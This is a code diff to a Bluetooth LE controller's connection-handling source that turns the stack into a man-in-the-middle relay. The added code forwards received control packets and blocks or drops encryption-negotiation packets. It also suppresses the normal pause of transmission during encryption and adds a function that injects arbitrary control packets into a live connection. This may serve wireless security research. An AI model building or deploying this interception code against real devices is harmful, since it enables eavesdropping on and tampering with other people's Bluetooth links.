@@ -10,6 +10,10 @@
 #include <bluetooth/bluetooth.h>
 #include <sys/byteorder.h>
 
+#if defined(CONFIG_USE_SEGGER_RTT)
+#include <SEGGER_RTT.h>
+#endif
+
 #include "hal/ecb.h"
 #include "hal/ccm.h"
 #include "hal/ticker.h"
@@ -40,6 +44,10 @@
 #include "ll.h"
 #include "ll_feat.h"
 #include "ll_settings.h"
+
+#include "otf_controller_cfg/otf_controller_cfg.h"
+#include "mitm/mitm.h"
+#include "otf_controller_cfg/otf_controller_cfg.h"
 
 #define BT_DBG_ENABLED IS_ENABLED(CONFIG_BT_DEBUG_HCI_DRIVER)
 #define LOG_MODULE_NAME bt_ctlr_ull_conn
@@ -1341,6 +1349,7 @@ void ull_conn_tx_demux(uint8_t count)
 			}
 
 			conn->tx_data_last = tx;
+
 		} else {
 			struct node_tx *tx = lll_tx->node;
 			struct pdu_data *p = (void *)tx->pdu;
@@ -1361,6 +1370,7 @@ void ull_conn_tx_lll_enqueue(struct ll_conn *conn, uint8_t count)
 {
 	bool pause_tx = false;
 
+
 	while (conn->tx_head &&
 	       ((
 #if defined(CONFIG_BT_CTLR_PHY)
@@ -1372,6 +1382,7 @@ void ull_conn_tx_lll_enqueue(struct ll_conn *conn, uint8_t count)
 #endif /* CONFIG_BT_CTLR_LE_ENC */
 		 1) ||
 		(!pause_tx && (conn->tx_head == conn->tx_ctrl))) && count--) {
+
 		struct pdu_data *pdu_tx;
 		struct node_tx *tx;
 		memq_link_t *link;
@@ -1379,6 +1390,7 @@ void ull_conn_tx_lll_enqueue(struct ll_conn *conn, uint8_t count)
 		tx = tx_ull_dequeue(conn, conn->tx_head);
 
 		pdu_tx = (void *)tx->pdu;
+
 		if (pdu_tx->ll_id == PDU_DATA_LLID_CTRL) {
 			ctrl_tx_pre_ack(conn, pdu_tx);
 		}
@@ -1623,6 +1635,11 @@ static int init_reset(void)
 #endif /* CONFIG_BT_CTLR_PHY_CODED */
 #endif /* CONFIG_BT_CTLR_PHY */
 
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0,"MITM_ENC_ON = 0\n");
+#endif
+    MITM_ENC_ON = 0U;
+    reset_blocked_pdus();
 	return 0;
 }
 
@@ -1765,6 +1782,7 @@ static struct node_tx *tx_ull_dequeue(struct ll_conn *conn, struct node_tx *tx)
 		struct pdu_data *pdu_data_tx;
 
 		pdu_data_tx = (void *)conn->tx_head->pdu;
+
 		if ((pdu_data_tx->ll_id != PDU_DATA_LLID_CTRL) ||
 		    ((pdu_data_tx->llctrl.opcode !=
 		      PDU_DATA_LLCTRL_TYPE_ENC_REQ) &&
@@ -1773,7 +1791,6 @@ static struct node_tx *tx_ull_dequeue(struct ll_conn *conn, struct node_tx *tx)
 			conn->tx_ctrl = conn->tx_ctrl_last = conn->tx_head;
 		}
 	}
-
 	if (conn->tx_head == conn->tx_ctrl) {
 		conn->tx_head = conn->tx_head->next;
 		if (conn->tx_ctrl == conn->tx_ctrl_last) {
@@ -1794,12 +1811,12 @@ static struct node_tx *tx_ull_dequeue(struct ll_conn *conn, struct node_tx *tx)
 		/* point to NULL to indicate a Data PDU mem alloc */
 		tx->next = NULL;
 	}
-
 	return tx;
 }
 
 static void tx_ull_flush(struct ll_conn *conn)
 {
+
 	while (conn->tx_head) {
 		struct node_tx *tx;
 		memq_link_t *link;
@@ -1826,6 +1843,7 @@ static void tx_lll_flush(void *param)
 
 	link = memq_dequeue(lll->memq_tx.tail, &lll->memq_tx.head,
 			    (void **)&tx);
+
 	while (link) {
 		struct lll_tx *lll_tx;
 		uint8_t idx;
@@ -2738,6 +2756,10 @@ static inline void event_enc_prep(struct ll_conn *conn)
 
 		/* resume data packet rx and tx */
 		conn->llcp_enc.pause_rx = 0U;
+
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:2778 pause_tx=0\n");
+#endif
 		conn->llcp_enc.pause_tx = 0U;
 #endif /* !CONFIG_BT_CTLR_FAST_ENC */
 	}
@@ -4443,6 +4465,9 @@ static inline int reject_ind_enc_recv(struct ll_conn *conn)
 	conn->llcp_enc.pause_rx = 0U;
 	conn->llcp_enc.pause_tx = 0U;
 
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:4486 pause_tx=0\n");
+#endif
 	/* Procedure complete */
 	conn->llcp_ack = conn->llcp_req;
 	conn->procedure_expire = 0U;
@@ -5056,7 +5081,12 @@ static inline void ctrl_tx_pre_ack(struct ll_conn *conn,
 	case PDU_DATA_LLCTRL_TYPE_ENC_RSP:
 	case PDU_DATA_LLCTRL_TYPE_PAUSE_ENC_REQ:
 		/* pause data packet tx */
-		conn->llcp_enc.pause_tx = 1U;
+        if(!MITM_ON && !is_ctrl_pdu_blocked(pdu_tx->llctrl.opcode)){
+#if defined(CONFIG_USE_SEGGER_RTT)
+            SEGGER_RTT_printf(0, "ull_conn:5103 pause_tx=1\n");
+#endif
+		    conn->llcp_enc.pause_tx = 1U;
+        }
 		break;
 #endif /* CONFIG_BT_CTLR_LE_ENC */
 
@@ -5098,8 +5128,12 @@ static inline void ctrl_tx_ack(struct ll_conn *conn, struct node_tx **tx,
 		       &pdu_tx->llctrl.enc_req.ivm[0], 4);
 
 		/* pause data packet tx */
-		conn->llcp_enc.pause_tx = 1U;
-
+        if(!MITM_ON && !is_ctrl_pdu_blocked(pdu_tx->llctrl.opcode)){
+#if defined(CONFIG_USE_SEGGER_RTT)
+            SEGGER_RTT_printf(0, "ull_conn:5149 pause_tx=1\n");
+#endif
+		    conn->llcp_enc.pause_tx = 1U;
+        }
 		/* Start Procedure Timeout (this will not replace terminate
 		 * procedure which always gets place before any packets
 		 * going out, hence safe by design).
@@ -5112,7 +5146,13 @@ static inline void ctrl_tx_ack(struct ll_conn *conn, struct node_tx **tx,
 
 	case PDU_DATA_LLCTRL_TYPE_ENC_RSP:
 		/* pause data packet tx */
-		conn->llcp_enc.pause_tx = 1U;
+
+        if(!MITM_ON && !is_ctrl_pdu_blocked(pdu_tx->llctrl.opcode)){
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:5167 pause_tx=1\n");
+#endif
+		    conn->llcp_enc.pause_tx = 1U;
+        }
 		break;
 
 	case PDU_DATA_LLCTRL_TYPE_START_ENC_REQ:
@@ -5124,8 +5164,12 @@ static inline void ctrl_tx_ack(struct ll_conn *conn, struct node_tx **tx,
 
 	case PDU_DATA_LLCTRL_TYPE_PAUSE_ENC_REQ:
 		/* pause data packet tx */
-		conn->llcp_enc.pause_tx = 1U;
-
+        if(!MITM_ON && !is_ctrl_pdu_blocked(pdu_tx->llctrl.opcode)){
+#if defined(CONFIG_USE_SEGGER_RTT)
+            SEGGER_RTT_printf(0, "ull_conn:5183 pause_tx=1\n");
+#endif
+		    conn->llcp_enc.pause_tx = 1U;
+        }
 		/* key refresh */
 		conn->llcp_enc.refresh = 1U;
 
@@ -5145,7 +5189,12 @@ static inline void ctrl_tx_ack(struct ll_conn *conn, struct node_tx **tx,
 			enc_req_reused_send(conn, tx);
 		} else {
 			/* pause data packet tx */
-			conn->llcp_enc.pause_tx = 1U;
+            if(!MITM_ON && !is_ctrl_pdu_blocked(pdu_tx->llctrl.opcode)){
+#if defined(CONFIG_USE_SEGGER_RTT)
+                SEGGER_RTT_printf(0, "ull_conn:5208 pause_tx=1\n");
+#endif
+			    conn->llcp_enc.pause_tx = 1U;
+            }
 		}
 		break;
 
@@ -5157,10 +5206,16 @@ static inline void ctrl_tx_ack(struct ll_conn *conn, struct node_tx **tx,
 		__fallthrough;
 
 	case PDU_DATA_LLCTRL_TYPE_REJECT_IND:
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:5207 pause_tx=%d\n",conn->llcp_enc.pause_rx);
+#endif
 		/* resume data packet rx and tx */
 		conn->llcp_enc.pause_rx = 0U;
 		conn->llcp_enc.pause_tx = 0U;
 
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:5207 pause_tx=%d\n",conn->llcp_enc.pause_rx);
+#endif
 		/* Procedure complete */
 		conn->procedure_expire = 0U;
 		break;
@@ -5317,7 +5372,6 @@ static inline bool pdu_len_cmp(uint8_t opcode, uint8_t len)
 		(offsetof(struct pdu_data_llctrl, min_used_chans_ind) +
 		 sizeof(struct pdu_data_llctrl_min_used_chans_ind)),
 	};
-
 	return ctrl_len_lut[opcode] == len;
 }
 
@@ -5328,6 +5382,50 @@ static inline int ctrl_rx(memq_link_t *link, struct node_rx_pdu **rx,
 	uint8_t opcode;
 
 	opcode = pdu_rx->llctrl.opcode;
+
+    le_forward((void *)pdu_rx, 2U);
+
+    // First check if current PDU should be blocked
+    if(!MITM_ENC_ON && is_ctrl_pdu_blocked(opcode)){
+		/* Mark for buffer for release */
+		(*rx)->hdr.type = NODE_RX_TYPE_DC_PDU_RELEASE;
+#if defined(CONFIG_USE_SEGGER_RTT)
+        SEGGER_RTT_printf(0, "Blocking PDU %d\n", opcode);
+#endif
+		return 0;
+    }
+
+    // Next check if MITM mode is active and PDU should be blocked
+#if defined(CONFIG_BT_CTLR_LE_ENC)
+	if (MITM_ON && (opcode == PDU_DATA_LLCTRL_TYPE_ENC_REQ ||
+			  opcode == PDU_DATA_LLCTRL_TYPE_ENC_RSP ||
+			  opcode == PDU_DATA_LLCTRL_TYPE_START_ENC_REQ ||
+			  opcode == PDU_DATA_LLCTRL_TYPE_START_ENC_RSP ||
+			  opcode == PDU_DATA_LLCTRL_TYPE_PAUSE_ENC_REQ ||
+			  opcode == PDU_DATA_LLCTRL_TYPE_PAUSE_ENC_RSP)) {
+
+        if(opcode == PDU_DATA_LLCTRL_TYPE_START_ENC_REQ){
+#if defined(CONFIG_USE_SEGGER_RTT)
+            if(!MITM_ENC_ON)
+            {
+                SEGGER_RTT_printf(0, "Turn mitm enc on, because opcode = %d and mitm = %d\n", opcode, MITM_ON);
+            }
+#endif
+		    MITM_ENC_ON = 1U;
+        }
+		/* Mark for buffer for release */
+		(*rx)->hdr.type = NODE_RX_TYPE_DC_PDU_RELEASE;
+		return 0;
+	}
+    // Finally check if we are in blind flight and the packet is encrypted and cannot be answeared correct
+	else if (MITM_ENC_ON) {
+#if defined(CONFIG_USE_SEGGER_RTT)
+        SEGGER_RTT_printf(0, "Blocking PDU with opcode %x, since mitm enc on!\n", opcode);
+#endif
+		(*rx)->hdr.type = NODE_RX_TYPE_DC_PDU_RELEASE;
+		return 0;
+	}
+#endif
 
 #if defined(CONFIG_BT_CTLR_LE_ENC)
 	/* FIXME: do check in individual case to reduce CPU time */
@@ -5509,12 +5607,20 @@ static inline int ctrl_rx(memq_link_t *link, struct node_rx_pdu **rx,
 			/* resume data packet rx and tx */
 			conn->llcp_enc.pause_rx = 0U;
 			conn->llcp_enc.pause_tx = 0U;
+
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:5594 pause_tx=0\n");
+#endif
 #endif /* CONFIG_BT_CTLR_FAST_ENC */
 
 		} else {
 			/* resume data packet rx and tx */
 			conn->llcp_enc.pause_rx = 0U;
 			conn->llcp_enc.pause_tx = 0U;
+
+#if defined(CONFIG_USE_SEGGER_RTT)
+    SEGGER_RTT_printf(0, "ull_conn:5600 pause_tx=0\n");
+#endif
 		}
 
 		/* enqueue the start enc resp (encryption change/refresh) */
@@ -6348,3 +6454,46 @@ static uint8_t force_md_cnt_calc(struct lll_conn *lll_conn, uint32_t tx_rate)
 	return force_md_cnt;
 }
 #endif /* CONFIG_BT_CTLR_FORCE_MD_AUTO */
+
+/**
+ * Manual sending of CTRL PDUs
+ */
+int public_ctrl_pdu_send(uint8_t opcode, uint8_t length, uint8_t *data)
+{
+	struct pdu_data *pdu_ctrl_tx;
+	struct node_tx *tx;
+
+	/* acquire tx mem */
+	tx = mem_acquire(&mem_conn_tx_ctrl.free);
+	if (!tx) {
+		return -ENOBUFS;
+	}
+
+	pdu_ctrl_tx = (void *)tx->pdu;
+
+	pdu_ctrl_tx->ll_id = PDU_DATA_LLID_CTRL;
+	pdu_ctrl_tx->len = length;
+
+    // PDU is encyrypted, just copy the data over the struct
+    if(opcode==0xFF){
+	    memcpy(&pdu_ctrl_tx->lldata[0], data, length);
+    }
+    else
+    {
+	    pdu_ctrl_tx->llctrl.opcode = opcode;
+
+        // Do not override the opcode, therefore start with index 1 and copy one byte less
+    	if(length>1){
+            memcpy(&pdu_ctrl_tx->lldata[1], data, length-1);
+        }
+    }
+
+	struct ll_conn *conn;
+	conn = ll_connected_get(0);
+
+	if (conn == NULL)
+		return 1;
+	ctrl_tx_enqueue(conn, tx);
+
+	return 0;
+}
